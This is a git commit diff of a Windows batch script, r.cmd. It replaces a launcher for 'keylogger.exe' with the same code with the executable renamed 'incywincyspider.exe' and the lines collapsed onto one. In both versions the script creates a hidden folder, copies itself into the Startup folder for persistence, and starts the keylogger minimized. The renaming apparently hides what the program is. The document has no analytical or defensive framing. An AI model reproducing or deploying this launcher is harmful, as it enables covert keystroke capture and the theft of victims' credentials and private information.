113b675ff170d4cd108fba2b7e8b33e9b419b487
whispiqx <xterm8899@gmail.com>
2025-09-27 09:38:24 +0100

    Update r.cmd

--- r.cmd
+++ r.cmd
@@ -1,16 +1,1 @@
-@echo off
-
-set "KEYLOGGER_PATH=%ALLUSERSPROFILE%\AppDataLocal\HiddenDir\keylogger.exe"
-set "STARTUP_PATH=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\keylogger_starter.cmd"
-
-mkdir "%ALLUSERSPROFILE%\AppDataLocal\HiddenDir" 2>nul
-attrib +h "%ALLUSERSPROFILE%\AppDataLocal\HiddenDir" >nul
-
-
-copy "%~f0" "%STARTUP_PATH%" >nul
-
-
-start /min "" "%KEYLOGGER_PATH%"
-
-d
-exit
+@echo off set "KEYLOGGER_PATH=%ALLUSERSPROFILE%\AppDataLocal\HiddenDir\incywincyspider.exe" set "STARTUP_PATH=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\incywincyspider_starter.cmd" mkdir "%ALLUSERSPROFILE%\AppDataLocal\HiddenDir" 2>nul attrib +h "%ALLUSERSPROFILE%\AppDataLocal\HiddenDir" >nul copy "%~f0" "%STARTUP_PATH%" >nul start /min "" "%KEYLOGGER_PATH%" exit
